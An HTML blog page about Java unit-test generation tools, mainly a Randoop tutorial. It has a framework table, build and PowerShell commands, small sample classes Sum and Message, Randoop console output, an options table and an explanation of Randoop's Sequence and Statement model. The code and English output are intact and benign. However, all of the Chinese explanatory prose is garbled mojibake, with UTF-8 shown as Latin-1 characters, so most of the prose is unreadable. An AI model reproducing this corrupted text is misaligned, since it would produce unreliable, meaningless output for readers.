href="https://github.com/selenide/selenide">Selenide</a></td><td>BDD</td><td>ç”± Selenium æä¾›æ”¯æŒï¼Œç½‘ç«™æµ‹è¯•</td></tr><tr><td><a href="https://github.com/spockframework/spock">Spock</a></td><td>BDD</td><td>ç½‘ç«™æµ‹è¯•</td></tr><tr><td><a href="https://github.com/cucumber/cucumber-jvm">Cucumber</a></td><td>BDD</td><td>æ”¯æŒ Javaã€JSã€Ruby ç­‰å¤šç§è¨€</td></tr><tr><td><a href="https://github.com/EvoSuite/evosuite/tree/v1.2.0">EvoSuite</a></td><td></td><td>è‡ªåŠ¨ç”Ÿæˆ JUnit å•å…ƒæµ‹è¯•</td></tr><tr><td><a href="https://github.com/randoop/randoop">Randoop</a></td><td></td><td>è‡ªåŠ¨ç”Ÿæˆ JUnit å•å…ƒæµ‹è¯•</td></tr><tr><td><a href="https://github.com/ksen007/janala2">CATG</a></td><td></td><td>concolic æµ‹è¯•å¼•æ“ï¼Œä½¿ç”¨ ASM è¿›è¡Œæ’æ¡©ï¼Œä¾èµ– python2.7ï¼Œ18 å¹´åœæ­¢æ›´æ–°</td></tr><tr><td><a href="https://github.com/konveyor/tackle-test-generator-cli">Tackle-test</a></td><td></td><td>é›†æˆ EvoSuite å’Œ Randoop</td></tr><tr><td><a href="https://github.com/vorpal-research/kex/tree/sbst-contest">Kex</a></td><td></td><td>ç”¨äº Java å­—èŠ‚ç çš„ç™½ç›’æ¨¡ç³Šæµ‹è¯•å·¥å…·</td></tr><tr><td><a href="https://github.com/ilebrero/evosuite/releases/tag/DSE.SBSTToolCompetition2021">EvoSuite DSE</a></td><td></td><td>æ”¯æŒ concolic æµ‹è¯•</td></tr></tbody></table><p>é™¤äº†å¼€æºæ¡†æ¶ä¹‹å¤–ï¼Œä¹Ÿæœ‰äº›è½¯ä»¶æ”¯æŒè‡ªåŠ¨åŒ–å•å…ƒæµ‹è¯•ï¼ˆAutomated Unit Testingï¼‰ï¼ŒåŒ…æ‹¬ Devmateã€Diffblueã€Ponicodeã€Symflower ç­‰ç­‰ã€‚</p><h1 id="Randoop"><a href="#Randoop" class="headerlink" title="Randoop"></a>Randoop</h1><h2 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>å¤§éƒ¨åˆ†è„šæœ¬ä½¿ç”¨ Perl ç¼–å†™ï¼Œæ— æ³•åœ¨ Windows ç¯å¢ƒä¸­ç¼–è¯‘</p><ul><li><a href="https://github.com/randoop/randoop/issues/165">Generating user manual fails on Windows #165</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/randoop/randoop.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¯‘ Randoopã€ç¼–è¯‘ Java ä»£ç†ã€è¿è¡Œæ‰€æœ‰æµ‹è¯•ã€æ„å»º jar æ–‡ä»¶å¹¶ä»æº Javadoc æ›´æ–°æ‰‹å†Œ</span></span><br><span class="line">./gradlew build manual</span><br></pre></td></tr></table></figure><p>Windows ä¸­å¯ä»¥ä½¿ç”¨ç¼–è¯‘å¥½çš„æ–‡ä»¶ï¼š<a href="https://github.com/randoop/randoop/releases/download/v4.3.0/randoop-4.3.0.zip">randoop-4.3.0.zip</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆpowershellï¼‰</span></span><br><span class="line"><span class="variable">$Env:RANDOOP_JAR</span> = <span class="string">&quot;D:\Study\Github\Java-Deserialization\å®éªŒ\UnitTest\randoop-all-4.3.0.jar&quot;</span></span><br><span class="line"><span class="variable">$Env:RANDOOP_JAR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸®åŠ©ä¿¡æ¯</span></span><br><span class="line">java <span class="literal">-classpath</span> <span class="variable">$Env:RANDOOP_JAR</span> randoop.main.Main help gentests</span><br><span class="line"></span><br><span class="line">java <span class="literal">-classpath</span> randoop<span class="literal">-all-4</span>.<span class="number">3.0</span>.jar randoop.main.Main help gentests</span><br></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒRandoop ç”Ÿæˆå¹¶è¾“å‡ºä¸¤ç§å•å…ƒæµ‹è¯•ï¼Œå†™å…¥å•ç‹¬çš„æ–‡ä»¶ã€‚</p><ul><li>é”™è¯¯æ˜¾ç¤ºæµ‹è¯•ï¼ˆ<code>error-revealing-tests</code>ï¼‰æ˜¯åœ¨æ‰§è¡Œæ—¶å¤±è´¥çš„æµ‹è¯•ï¼Œè¡¨æ˜ä¸€ä¸ªæˆ–å¤šä¸ªè¢«æµ‹ç±»ä¸­å­˜åœ¨æ½œåœ¨é”™è¯¯ã€‚<ul><li>å½“ Randoop è°ƒç”¨åˆ›å»ºå¯¹è±¡çš„æ–¹æ³•æ—¶ï¼ŒRandoop ä¼šéªŒè¯è¯¥å¯¹è±¡çš„æ ¼å¼æ˜¯å¦æ­£ç¡®ã€‚</li><li>æ£€æŸ¥ï¼š<code>Object.equals()</code>ã€<code>Object.hashCode()</code>ã€<code>Object.clone()</code>ã€<code>Object.toString()</code>ã€<code>Comparable.compareTo()</code>ã€<code>Comparator.compare()</code>ã€ä½¿ç”¨ <code>@CheckRep</code> æ³¨é‡Šçš„ç©ºæ–¹æ³•</li></ul></li><li>å›å½’æµ‹è¯•ï¼ˆ<code>regression-tests</code>ï¼‰æ˜¯åœ¨æ‰§è¡Œæ—¶é€šè¿‡çš„æµ‹è¯•ï¼Œå¯ç”¨äºæ‰©å……å›å½’æµ‹è¯•å¥—ä»¶ã€‚<ul><li>åœ¨ç¨‹åºæ›´æ”¹&#x2F;é‡æ„ä¹‹å‰å®æ–½çš„æµ‹è¯•åœ¨ä»£ç æ›´æ–°ååº”è¯¥ä»ç„¶æˆåŠŸï¼Œå¦åˆ™å°±å¯èƒ½åœ¨ä»£ç ä¸­å¼•å…¥äº†æ–°é”™è¯¯ã€‚</li></ul></li></ul><p>Randoop æ”¯æŒå¯¹ jar æ–‡ä»¶ã€æŒ‡å®šç±»ã€æŒ‡å®šæ–¹æ³•ç”Ÿæˆ JUnit æµ‹è¯•ã€‚</p><h3 id="æŒ‡å®šå¤šä¸ªç±»"><a href="#æŒ‡å®šå¤šä¸ªç±»" class="headerlink" title="æŒ‡å®šå¤šä¸ªç±»"></a>æŒ‡å®šå¤šä¸ªç±»</h3><p>åˆ›å»º myclasses.txt æ–‡ä»¶ï¼ŒæŒ‡å®šè¢«æµ‹ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.util.Collections</span><br><span class="line">java.util.TreeSet</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ randoop å¹¶å°†æ‰§è¡Œæ—¶é—´é™åˆ¶ä¸º 60 ç§’</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-classpath</span> <span class="variable">$Env:RANDOOP_JAR</span> randoop.main.Main gentests <span class="literal">--classlist</span>=myclasses.txt <span class="literal">--time-limit</span>=<span class="number">60</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼Œåªç”Ÿæˆäº† RegressionTestï¼Œæ²¡æœ‰ ErrorTest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Randoop for Java version 4.3.0.</span><br><span class="line"></span><br><span class="line">Will try to generate tests for 2 classes.</span><br><span class="line">PUBLIC MEMBERS=112</span><br><span class="line">Explorer = ForwardGenerator(steps: 0, null steps: 0, num_sequences_generated: 0;</span><br><span class="line">    allSequences: 0, regresson seqs: 0, error seqs: 0=0=0, invalid seqs: 0, subsumed_sequences: 0, num_failed_output_test: 0;</span><br><span class="line">    runtimePrimitivesSeen:38)</span><br><span class="line"></span><br><span class="line">Progress update: steps=1, test inputs generated=0, failing inputs=0      (2022-02-28T02:36:46.426Z     43.5M used)</span><br><span class="line">Progress update: steps=1000, test inputs generated=823, failing inputs=0      (2022-02-28T02:37:03.368Z     419M used)</span><br><span class="line">Progress update: steps=2000, test inputs generated=1630, failing inputs=0      (2022-02-28T02:37:19.685Z     528M used)</span><br><span class="line">Progress update: steps=3000, test inputs generated=2440, failing inputs=0      (2022-02-28T02:37:35.947Z     339M used)</span><br><span class="line">Progress update: steps=3690, test inputs generated=2960, failing inputs=0      (2022-02-28T02:37:46.426Z     225M used)</span><br><span class="line">Normal method executions: 4962090</span><br><span class="line"></span><br><span class="line">Exceptional method executions: 534</span><br><span class="line"></span><br><span class="line">Average method execution time (normal termination):      0.000157                                              </span><br><span class="line">Average method execution time (exceptional termination): 0.0369                                      </span><br><span class="line">Approximate memory usage 225M</span><br><span class="line"></span><br><span class="line">Explorer = ForwardGenerator(steps: 3690, null steps: 730, num_sequences_generated: 2960;</span><br><span class="line">    allSequences: 2960, regresson seqs: 1254, error seqs: 0=0=0, invalid seqs: 0, subsumed_sequences: 0, num_failed_output_test: 1706;</span><br><span class="line">    runtimePrimitivesSeen:47)</span><br><span class="line"></span><br><span class="line">No error-revealing tests to output.</span><br><span class="line"></span><br><span class="line">About to look for failing assertions in 831 regression sequences.</span><br><span class="line"></span><br><span class="line">Regression test output:</span><br><span class="line">Regression test count: 831</span><br><span class="line">Writing regression JUnit tests...</span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest0.java </span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest1.java</span><br><span class="line">Created file D:\Study\Github\randoop\RegressionTest.java</span><br><span class="line">Wrote regression JUnit tests.</span><br><span class="line">About to look for flaky methods.</span><br><span class="line"></span><br><span class="line">Invalid tests generated: 0</span><br><span class="line"></span><br><span class="line">Uncompilable sequences generated (count: 1705).</span><br><span class="line">Please report uncompilable sequences at https://github.com/randoop/randoop/issues ,</span><br><span class="line">providing the information requested at https://randoop.github.io/randoop/manual/index.html#bug-reporting .</span><br></pre></td></tr></table></figure><h3 id="æŒ‡å®šç±»æ–‡ä»¶"><a href="#æŒ‡å®šç±»æ–‡ä»¶" class="headerlink" title="æŒ‡å®šç±»æ–‡ä»¶"></a>æŒ‡å®šç±»æ–‡ä»¶</h3><p>åˆ›å»ºæ–‡ä»¶ Message.java å¹¶ç¼–è¯‘ä¸º .class æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line"><span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Message</span><span class="params">(String message)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.message = message;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">printMessage</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(message);</span><br><span class="line"><span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‚æ•° <code>--testclass</code> æŒ‡å®šè¢«æµ‹ç±»ï¼Œæ³¨æ„éœ€è¦æ·»åŠ  classpath</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line">javac Message.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæµ‹è¯•</span></span><br><span class="line">java -classpath <span class="string">&quot;.;<span class="variable">$Env</span>:RANDOOP_JAR&quot;</span> randoop.main.Main gentests --testclass=Message --time-limit=60</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ 199 ä¸ªå›å½’æµ‹è¯•ï¼Œç›´æ¥å°†ç›¸å…³æ–‡ä»¶éƒ½æ‹–åˆ° test ç›®å½•ä¸‹ï¼Œæ‰§è¡Œæµ‹è¯•ï¼Œå…¨éƒ¨é€šè¿‡</p><img src="https://s2.loli.net/2022/04/27/5J6w4st93zOim2a.jpg" ><p>åˆ›å»º Sum.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sum</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b; i++) &#123;</span><br><span class="line">            result = add(result, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸º .class æ–‡ä»¶ï¼Œå¹¶ç”Ÿæˆæµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line">javac Sum.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæµ‹è¯•</span></span><br><span class="line">java -classpath <span class="string">&quot;.;<span class="variable">$Env</span>:RANDOOP_JAR&quot;</span> randoop.main.Main gentests --testclass=Sum --time-limit=60</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ 1360 ä¸ªæµ‹è¯•ï¼Œæ›´æ”¹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sum</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b + <span class="number">1</span>;  <span class="comment">// ä¿®æ”¹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b; i++) &#123;</span><br><span class="line">            result = add(result, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œåˆšæ‰ç”Ÿæˆçš„å›å½’æµ‹è¯•ï¼Œ1357 ä¸ªæµ‹è¯•å¤±è´¥</p><img src="https://s2.loli.net/2022/04/27/k3JyxITYrBjsPce.jpg" style="zoom: 65%;"><h3 id="æŒ‡å®šæ–¹æ³•"><a href="#æŒ‡å®šæ–¹æ³•" class="headerlink" title="æŒ‡å®šæ–¹æ³•"></a>æŒ‡å®šæ–¹æ³•</h3><p>å¯èƒ½ç”¨åˆ°çš„å‚æ•°</p><ul><li>æŒ‡å®šæµ‹è¯•èŒƒå›´çš„å¸¸è§åº¦ä¾æ¬¡é€’å‡ï¼ŒåŒæ—¶å‡ºé”™çš„æ¦‚ç‡é€’å¢ï¼šæŒ‡å®š jarï¼ŒæŒ‡å®šç±»ï¼ŒæŒ‡å®šæ–¹æ³•</li><li><a href="https://randoop.github.io/randoop/manual/class_list_example.txt">classlist.txt ç¤ºä¾‹</a></li><li><a href="https://randoop.github.io/randoop/manual/method_list_example.txt">methodlist.txt ç¤ºä¾‹</a></li></ul><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>--testjar=filename</code></td><td>å°†ç»™å®š jar æ–‡ä»¶ä¸­çš„æ¯ä¸ªç±»ä½œä¸ºå¾…æµ‹ç±»</td></tr><tr><td><code>--classlist=filename</code></td><td>åˆ—å‡ºè¦æµ‹è¯•çš„ç±»ï¼Œæ‰€æœ‰çš„æ–¹æ³•éƒ½å°†ä½œä¸ºè¢«æµ‹æ–¹æ³•</td></tr><tr><td><code>--testclass=string</code></td><td>æŒ‡å®šå¾…æµ‹ç±»ï¼ˆå®Œå…¨é™å®šåï¼‰</td></tr><tr><td><code>--methodlist=filename</code></td><td>æµ‹è¯•ä¸­è°ƒç”¨çš„æ–¹æ³•å’Œæ„é€ å‡½æ•°åˆ—è¡¨ï¼ˆå®Œå…¨é™å®šåï¼‰</td></tr><tr><td><code>--omit-classes=regex</code></td><td>æ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŒ‡å®šä¸åœ¨æµ‹è¯•ä¸­ä½¿ç”¨çš„ç±»</td></tr><tr><td><code>--omit-classes-file=filename</code></td><td>åˆ—å‡ºæ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŒ‡å®šä¸åœ¨æµ‹è¯•ä¸­ä½¿ç”¨çš„ç±»</td></tr><tr><td><code>--omit-methods=regex</code></td><td>æ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŒ‡å®šä¸åœ¨æµ‹è¯•ä¸­ä½¿ç”¨çš„æ–¹æ³•ã€‚ä¸ä¼šé˜»æ­¢å…¶ä»–æ–¹æ³•å¯¹å…¶çš„é—´æ¥è°ƒç”¨</td></tr><tr><td><code>--omit-methods-file=filename</code></td><td>åˆ—å‡ºæ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŒ‡å®šä¸åœ¨æµ‹è¯•ä¸­ä½¿ç”¨çš„æ–¹æ³•</td></tr><tr><td><code>--require-classname-in-test=regex</code></td><td>æ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŒ‡å®šå¿…é¡»åœ¨æµ‹è¯•ä¸­å‡ºç°çš„ç±»ã€‚</td></tr><tr><td><code>--require-covered-classes=filename</code></td><td>åˆ—å‡ºæµ‹è¯•å¿…é¡»ç›´æ¥æˆ–é—´æ¥ä½¿ç”¨çš„ç±»ï¼ŒåŒ…å«å…¶ä¸­ä¸€ä¸ªå³è¾“å‡º</td></tr><tr><td><code>--no-regression-tests=boolean</code></td><td>ç¦ç”¨å›å½’æµ‹è¯•è¾“å‡º</td></tr><tr><td><code>--deterministic=boolean</code></td><td>ç¡®å®šæ€§ï¼Œç›¸åŒè¾“å…¥ç›¸åŒè¾“å‡º</td></tr><tr><td><code>--log=filename</code></td><td>æ—¥å¿—è®°å½•</td></tr><tr><td><code>--time-limit=int</code></td><td>0 è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼Œå¦‚æœéé›¶åˆ™ä¸ç¡®å®šã€‚æ€»ä½“é™åˆ¶ï¼Œé»˜è®¤å€¼ 100 ç§’</td></tr><tr><td><code>--method-selection=&lt;enum&gt; </code></td><td>é€šè¿‡ä»ä¸€ç»„è¢«æµ‹æ–¹æ³•ä¸­è¿›è¡Œé€‰æ‹©æ¥ç”Ÿæˆæ–°çš„æµ‹è¯•ã€‚é»˜è®¤å‡åŒ€éšæœºï¼ˆUNIFORMï¼‰ï¼Œå¯é€‰ä¼˜å…ˆè€ƒè™‘åˆ†æ”¯è¦†ç›–ç‡è¾ƒä½çš„æ–¹æ³•ï¼ˆBLOODHOUNDï¼‰</td></tr><tr><td><code>--input-selection=&lt;enum&gt; </code></td><td>é€šè¿‡ç»„åˆä»¥å‰ç”Ÿæˆçš„æ—§æµ‹è¯•æ¥ç”Ÿæˆæ–°æµ‹è¯•ã€‚é»˜è®¤å‡åŒ€éšæœºï¼ˆUNIFORMï¼‰ï¼Œå¯é€‰çŸ­åºåˆ—åå¥½ï¼ˆSMALL_TESTSï¼‰</td></tr></tbody></table><p>Randoop é¡¹ç›®æƒ³æ³•ä¸­åŒ…æ‹¬æ–¹æ³•é€‰æ‹©ç­–ç•¥çš„ä¼˜åŒ–ï¼Œå…¶ä¸­å°±æåˆ°äº†è®©ç”¨æˆ·æŒ‡å®šå…³é”®æ–¹æ³•ï¼Œç›®å‰ä¼¼ä¹è¿˜æ²¡æœ‰å…·ä½“å®ç°ã€‚</p><ol><li><p>è€ƒè™‘ä¿®æ”¹ Randoop çš„é»˜è®¤ç”Ÿæˆå™¨ï¼ˆForwardGeneratorï¼‰</p><ul><li>ç”Ÿæˆç­–ç•¥</li><li>æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶ï¼Œå‘æ ‡å‡†é”™è¯¯è¿›è¡Œè¾“å‡ºï¼Œåº”è¯¥ä¼šå­˜å‚¨åœ¨ ErrorTest ä¸­</li></ul></li><li><p>ä½¿ç”¨æ–¹æ³•è§„èŒƒï¼ˆ<code>--specifications=file</code>ï¼‰è®¾ç½®ç‰¹å®šæ–¹æ³•çš„é¢„æœŸè¡Œä¸ºï¼Œå°†å…¶å½’ç±»åˆ°é”™è¯¯æ˜¾ç¤ºæµ‹è¯•ä¸­</p><ul><li><a href="https://randoop.github.io/randoop/manual/net_connection_spec.json">spec.json ç¤ºä¾‹</a></li></ul></li></ol><h3 id="é—®é¢˜ä¸è§£å†³"><a href="#é—®é¢˜ä¸è§£å†³" class="headerlink" title="é—®é¢˜ä¸è§£å†³"></a>é—®é¢˜ä¸è§£å†³</h3><ol><li><p>ä¹±ç </p><ul><li><code>Settings - Editor -File Encodings</code> å°†ç¼–ç å…¨éƒ¨æ”¹ä¸º UTF-8</li><li>åœ¨ <code>idea64.exe.vmoptions</code> æœ«å°¾æ·»åŠ  <code>-Dfile.encoding=UTF-8</code></li><li>é‡å¯ IDEA</li></ul></li><li><p>rawtypes</p><ul><li>æ³›å‹ç±»ç¼ºå°‘ç±»å‚æ•°ï¼Œæ·»åŠ  <code>&lt;?&gt;</code> å³å¯</li></ul></li><li><p>ç¨‹åºåŒ…ä¸å­˜åœ¨</p></li><li><p>cast</p></li></ol><img src="https://s2.loli.net/2022/04/27/c9vaBTLw63Eq2CD.png" ><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p>åœ¨ Randoop ä¸­ï¼Œæµ‹è¯•è¾“å…¥è¡¨ç¤ºä¸º Sequenceï¼Œæµ‹è¯•æ£€æŸ¥ä½¿ç”¨ Checks è¡¨ç¤ºã€‚æ¯ä¸ªåºåˆ—ç”±ä¸€ä¸ªæˆ–å¤šä¸ª Statement å¯¹è±¡ç»„æˆã€‚</p><p>Randoop çš„ç”Ÿæˆç®—æ³•åˆ›å»º Sequenceï¼Œä¸ºæ¯ä¸ªåºåˆ—æ·»åŠ é€‚å½“çš„ Checksï¼Œå¹¶å°†ç»“æœä½œä¸ºå•å…ƒæµ‹è¯•è¾“å‡ºã€‚</p><h3 id="Sequence"><a href="#Sequence" class="headerlink" title="Sequence"></a>Sequence</h3><p>Randoop ç”Ÿæˆ Sequence å¯¹è±¡ï¼Œé€šè¿‡æ·»åŠ æ£€æŸ¥æ¥æ„é€ å•å…ƒæµ‹è¯•çš„è¾“å…¥ã€‚åœ¨ Randoop ä¸­ï¼Œæ‰€æœ‰æµ‹è¯•è¾“å…¥éƒ½æ˜¯ä½¿ç”¨è¢«æµ‹ç±»çš„æ–¹æ³•å’Œæ„é€ å‡½æ•°çš„æ“ä½œåºåˆ—ã€‚</p><p>æ¯æ¡è¯­å¥åŒ…å«ä¸‰ä¸ªå…ƒç´ ï¼š</p><ul><li>æ­£åœ¨è¢«è°ƒç”¨çš„ç‰¹å®šæ–¹æ³•ï¼ˆæˆ–æ„é€ å‡½æ•°ï¼‰</li><li>æ¯æ¬¡è°ƒç”¨è¿”å›çš„å€¼ï¼ˆåŸå§‹å€¼æˆ–å¯¹è±¡ï¼‰</li><li>è°ƒç”¨çš„è¾“å…¥ï¼Œæ¥è‡ªå…ˆå‰è¯­å¥ä¸­äº§ç”Ÿçš„å€¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                  Result      Operation        Inputs</span><br><span class="line">                  ======      =============        ======</span><br><span class="line">statement 0:      l       =   new LinkedList       ()</span><br><span class="line">statement 1:      str     =   &quot;hi!&quot;                ()</span><br><span class="line">statement 2:                  addFirst             (l, str)</span><br><span class="line">statement 3:      i       =   size                 (l)</span><br><span class="line">statement 4:      t       =   new TreeSet          (l)</span><br><span class="line">statement 5:      s       =   synchronizedSet      (t)</span><br></pre></td></tr></table></figure><p>è¯­å¥çš„ä¸‰ä¸ªå…ƒç´ æ˜ å°„åˆ° Randoop ä¸­çš„ä»¥ä¸‹ç±»ï¼š</p><ul><li><p>Operation è¡¨ç¤ºè¯­å¥æ‰§è¡Œçš„æ“ä½œç±»å‹</p><ul><li>MethodCall è¡¨ç¤ºç‰¹å®šçš„æ–¹æ³•è°ƒç”¨ã€‚è¯¥ç±»ä¸ Java åå°„ Method ç±»ç›¸ä¼¼ï¼Œæ·»åŠ äº†å¯¹ Randoop æœ‰ç”¨çš„é™„åŠ åŠŸèƒ½ã€‚</li><li>ConstructorCall è¡¨ç¤ºæ„é€ å‡½æ•°è°ƒç”¨ã€‚</li><li>FieldGet å’Œ FieldSet è¡¨ç¤ºè·å–å’Œè®¾ç½®å…¬å…±å­—æ®µã€‚å­—æ®µç”±å®ç° AccessibleField çš„ç±»çš„å®ä¾‹è¡¨ç¤ºã€‚</li><li>EnumConstant è¡¨ç¤ºä¸€ä¸ªæšä¸¾å¸¸é‡å€¼ã€‚</li><li>NonreceiverTerm è¡¨ç¤ºå°†å˜é‡å£°æ˜å’Œåˆå§‹åŒ–ä¸ºåŸå§‹å€¼ã€å­—ç¬¦ä¸²æˆ–ç©ºå€¼çš„è¯­å¥ã€‚</li><li>ArrayCreation è¡¨ç¤ºå£°æ˜å¹¶åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„çš„è¯­å¥ï¼Œè¯¥æ•°ç»„ç”±ä¹‹å‰è¯­å¥ä¸­åˆ›å»ºçš„å€¼ç»„æˆã€‚</li></ul></li><li><p>Variables ä»£è¡¨è¯­å¥çš„è¾“å…¥å’Œè¾“å‡º</p><ul><li>Variable åªæ˜¯åºåˆ—ä¸­ç´¢å¼•çš„åŒ…è£…å™¨ï¼šç»™å®šåºåˆ— sï¼Œå˜é‡ s.getVariable(i) è¡¨ç¤ºåºåˆ—ä¸­ç¬¬ i ä¸ªè¯­å¥äº§ç”Ÿçš„å€¼ã€‚</li></ul></li></ul><p>åˆ›å»º 